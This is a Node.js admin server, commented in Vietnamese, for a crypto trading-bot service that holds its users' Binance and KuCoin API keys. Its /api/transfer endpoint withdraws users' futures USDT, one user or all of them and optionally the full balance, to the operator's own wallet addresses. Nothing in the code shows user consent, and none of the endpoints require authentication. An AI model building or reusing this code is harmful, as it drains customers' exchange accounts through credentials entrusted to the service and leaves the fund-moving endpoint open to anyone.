const http = require('http');
const fs = require('fs');
const path = require('path');
const ccxt = require('ccxt');

// --- CẤU HÌNH ---
const PORT = 4953;
const USER_DATA_DIR = path.join(__dirname, 'user_data');
const ADMIN_CACHE_DIR = path.join(__dirname, 'admin_cache');

// --- 1. LOAD VÍ ADMIN TỪ BALANCE.JS ---
let adminWallets = {};
try {
    // Thử tìm file balance.js ở thư mục cha (giống cấu trúc bot gốc)
    const p1 = path.join(__dirname, '../../balance.js');
    if (fs.existsSync(p1)) {
        adminWallets = require(p1).usdtDepositAddressesByNetwork || {};
    } else {
        // Thử tìm cùng thư mục
        const p2 = path.join(__dirname, 'balance.js');
        if (fs.existsSync(p2)) {
            adminWallets = require(p2).usdtDepositAddressesByNetwork || {};
        }
    }
    console.log('[INIT] Admin Wallets loaded:', Object.keys(adminWallets).length > 0 ? 'YES' : 'NO (Empty)');
} catch (e) { console.log('[WARN] Lỗi load balance.js:', e.message); }

if (!fs.existsSync(ADMIN_CACHE_DIR)) fs.mkdirSync(ADMIN_CACHE_DIR);

// --- HÀM HELPER ---
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const getSafeName = (u) => u.replace(/[^a-z0-9]/gi, '_').toLowerCase();

function initExchange(id, config) {
    const opts = { enableRateLimit: true, timeout: 30000 };
    try {
        if (id === 'binance') return new ccxt.binance({ apiKey: config.binanceApiKey, secret: config.binanceApiSecret, ...opts });
        if (id === 'binanceusdm') return new ccxt.binanceusdm({ apiKey: config.binanceApiKey, secret: config.binanceApiSecret, ...opts });
        if (id === 'kucoin') return new ccxt.kucoin({ apiKey: config.kucoinApiKey, secret: config.kucoinApiSecret, password: config.kucoinPassword, ...opts });
        if (id === 'kucoinfutures') return new ccxt.kucoinfutures({ apiKey: config.kucoinApiKey, secret: config.kucoinApiSecret, password: config.kucoinPassword, ...opts });
    } catch (e) { return null; }
    return null;
}

// --- 2. WORKER CHẠY NGẦM (GIỮ NGUYÊN ĐỂ KHÔNG LAG) ---
async function backgroundWorker() {
    console.log('[WORKER] 🔄 Đang quét lịch sử...');
    const files = fs.readdirSync(USER_DATA_DIR).filter(f => f.endsWith('_config.json'));
    for (const file of files) {
        try {
            const config = JSON.parse(fs.readFileSync(path.join(USER_DATA_DIR, file), 'utf8'));
            const safeName = getSafeName(config.username || file.replace('_config.json', ''));
            const cacheFile = path.join(ADMIN_CACHE_DIR, `${safeName}_history.json`);
            let history = fs.existsSync(cacheFile) ? JSON.parse(fs.readFileSync(cacheFile, 'utf8')) : [];

            const bEx = initExchange('binanceusdm', config);
            if (bEx) {
                try {
                    const lastTime = history.filter(x => x.ex === 'Binance').reduce((max, c) => Math.max(max, c.timestamp), 0);
                    const income = await bEx.fetchIncome(undefined, undefined, 1000, { startTime: lastTime + 1000 });
                    income.forEach(i => { if (!history.some(h => h.id === i.id)) history.push({ id: i.id, timestamp: i.timestamp, ex: 'Binance', symbol: i.symbol, type: i.info.incomeType, amount: parseFloat(i.amount) }); });
                } catch(e){}
            }
            const kEx = initExchange('kucoinfutures', config);
            if (kEx) {
                try {
                    const lastTime = history.filter(x => x.ex === 'Kucoin').reduce((max, c) => Math.max(max, c.timestamp), 0);
                    const ledger = await kEx.fetchLedger(undefined, lastTime + 1000, 1000);
                    ledger.forEach(i => { if ((i.info.type === 'RealisedPNL' || i.info.type === 'Funding') && !history.some(h => h.id === i.id)) history.push({ id: i.id, timestamp: i.timestamp, ex: 'Kucoin', symbol: i.info.symbol || i.currency, type: i.info.type, amount: parseFloat(i.amount) }); });
                } catch(e){}
            }
            history.sort((a,b) => b.timestamp - a.timestamp);
            fs.writeFileSync(cacheFile, JSON.stringify(history, null, 2));
        } catch(e){}
        await sleep(500);
    }
}
backgroundWorker();
setInterval(backgroundWorker, 300000);

// --- 3. SERVER ADMIN ---
const server = http.createServer(async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    const sendJSON = (d) => { res.writeHead(200, { 'Content-Type': 'application/json' }); res.end(JSON.stringify(d)); };

    if (req.method === 'GET' && req.url === '/') {
        fs.readFile(path.join(__dirname, 'admin.html'), (err, c) => {
            if(err) { res.writeHead(404); res.end('Missing admin.html'); return; }
            res.writeHead(200, {'Content-Type': 'text/html'}); res.end(c);
        });
        return;
    }

    if (req.url === '/api/users') {
        const users = [];
        fs.readdirSync(USER_DATA_DIR).filter(f => f.endsWith('_config.json')).forEach(f => {
            try {
                const c = JSON.parse(fs.readFileSync(path.join(USER_DATA_DIR, f), 'utf8'));
                const safeName = getSafeName(c.username || f.replace('_config.json',''));
                let pnl = 0;
                const cache = path.join(ADMIN_CACHE_DIR, `${safeName}_history.json`);
                if(fs.existsSync(cache)) pnl = JSON.parse(fs.readFileSync(cache,'utf8')).reduce((s,i)=>s+i.amount,0);
                users.push({ username: c.username||safeName, vipStatus: c.vipStatus||'none', binanceFuture: c.savedBinanceFut||0, kucoinFuture: c.savedKucoinFut||0, totalAll: c.savedTotalAssets||0, totalPnl: pnl });
            } catch(e){}
        });
        sendJSON(users); return;
    }

    if (req.url.startsWith('/api/details/')) {
        const s = getSafeName(decodeURIComponent(req.url.split('/api/details/')[1]));
        const d = { history: [], activeTrades: [], balances: { binance: 0, kucoin: 0 } };
        try {
            if(fs.existsSync(path.join(ADMIN_CACHE_DIR, `${s}_history.json`))) d.history = JSON.parse(fs.readFileSync(path.join(ADMIN_CACHE_DIR, `${s}_history.json`), 'utf8'));
            if(fs.existsSync(path.join(USER_DATA_DIR, `${s}_active_trades.json`))) d.activeTrades = JSON.parse(fs.readFileSync(path.join(USER_DATA_DIR, `${s}_active_trades.json`), 'utf8'));
            const c = JSON.parse(fs.readFileSync(path.join(USER_DATA_DIR, `${s}_config.json`), 'utf8'));
            d.balances = { binance: c.savedBinanceFut||0, kucoin: c.savedKucoinFut||0 };
        } catch(e){}
        sendJSON(d); return;
    }

    // --- API CHUYỂN TIỀN VỀ VÍ ADMIN (THEO YÊU CẦU MỚI) ---
    if (req.method === 'POST' && req.url === '/api/transfer') {
        let body = ''; req.on('data', c=>body+=c);
        req.on('end', async () => {
            const { direction, users, amount, isGetAll } = JSON.parse(body);
            const logs = [];
            const targets = (users === 'ALL') 
                ? fs.readdirSync(USER_DATA_DIR).filter(f=>f.endsWith('_config.json')) 
                : users.map(u => `${getSafeName(u)}_config.json`);

            logs.push(`🚀 Lệnh: ${direction === 'binance_to_kucoin' ? 'Binance -> Admin Kucoin (BEP20)' : 'Kucoin -> Admin Binance (APTOS)'}`);

            // CHECK VÍ ADMIN TRƯỚC
            let adminAddr = '';
            if (direction === 'binance_to_kucoin') {
                adminAddr = adminWallets['kucoin']?.['BEP20'];
                if (!adminAddr) { sendJSON({ logs: ['❌ Lỗi: Chưa cấu hình ví Admin Kucoin (BEP20) trong balance.js'] }); return; }
            } else {
                adminAddr = adminWallets['binance']?.['APTOS'] || adminWallets['binance']?.['APT'];
                if (!adminAddr) { sendJSON({ logs: ['❌ Lỗi: Chưa cấu hình ví Admin Binance (APTOS) trong balance.js'] }); return; }
            }
            logs.push(`🎯 Ví Admin nhận: ${adminAddr}`);

            for (const f of targets) {
                const p = path.join(USER_DATA_DIR, f);
                if (!fs.existsSync(p)) continue;
                const cfg = JSON.parse(fs.readFileSync(p, 'utf8'));
                const username = cfg.username || 'Unknown';
                let amt = parseFloat(amount);
                logs.push(`👤 User: ${username}`);

                try {
                    // LOGIC: BINANCE (User) -> KUCOIN (Admin) | Mạng: BEP20 (BSC)
                    if (direction === 'binance_to_kucoin') {
                        const bEx = initExchange('binance', cfg);
                        const bFut = initExchange('binanceusdm', cfg);
                        
                        if (isGetAll) {
                            const bal = await bFut.fetchBalance();
                            amt = bal.free['USDT'] || 0;
                            logs.push(`   > Get All: ${amt} USDT`);
                        }
                        if (amt < 2) { logs.push(`   > Số dư quá nhỏ (<2$). Skip.`); continue; }

                        // 1. Future -> Spot
                        await bFut.transfer('USDT', amt, 'future', 'spot');
                        logs.push(`   > Chuyển ${amt} về Spot.`);

                        // 2. Rút về ví Admin (BEP20)
                        await bEx.withdraw('USDT', amt, adminAddr, undefined, { network: 'BSC' });
                        logs.push(`   > ✅ Đã rút ${amt}$ về Admin (BEP20).`);
                    }

                    // LOGIC: KUCOIN (User) -> BINANCE (Admin) | Mạng: APTOS
                    else if (direction === 'kucoin_to_binance') {
                        const kEx = initExchange('kucoin', cfg);
                        const kFut = initExchange('kucoinfutures', cfg);

                        if (isGetAll) {
                            const bal = await kFut.fetchBalance();
                            amt = bal.free['USDT'] || 0;
                            logs.push(`   > Get All: ${amt} USDT`);
                        }
                        if (amt < 2) { logs.push(`   > Số dư quá nhỏ (<2$). Skip.`); continue; }

                        // 1. Future -> Main
                        await kFut.transfer('USDT', amt, 'future', 'main');
                        logs.push(`   > Chuyển ${amt} về Main.`);

                        // 2. Rút về ví Admin (APTOS)
                        await kEx.withdraw('USDT', amt, adminAddr, undefined, { network: 'APT' });
                        logs.push(`   > ✅ Đã rút ${amt}$ về Admin (APTOS).`);
                    }

                } catch (e) { logs.push(`   > ❌ Lỗi: ${e.message}`); }
            }
            sendJSON({ logs });
        });
        return;
    }

    if (req.method === 'POST' && req.url === '/api/admin/set-vip') {
        let body = ''; req.on('data', c=>body+=c);
        req.on('end', () => {
            const { users, vipStatus } = JSON.parse(body);
            const targets = (users === 'ALL') ? fs.readdirSync(USER_DATA_DIR).filter(f=>f.endsWith('_config.json')) : users.map(u=>`${getSafeName(u)}_config.json`);
            targets.forEach(f => {
                const p = path.join(USER_DATA_DIR, f);
                if(fs.existsSync(p)) {
                    const c = JSON.parse(fs.readFileSync(p,'utf8'));
                    c.vipStatus = vipStatus; c.vipExpiry = (vipStatus==='vip')?Date.now()+2592000000:0;
                    fs.writeFileSync(p, JSON.stringify(c,null,2));
                }
            });
            sendJSON({ success: true });
        });
        return;
    }
});

server.listen(PORT, () => {
    console.log(`Admin Server (With Admin Wallet Transfer) running at http://localhost:${PORT}`);
});
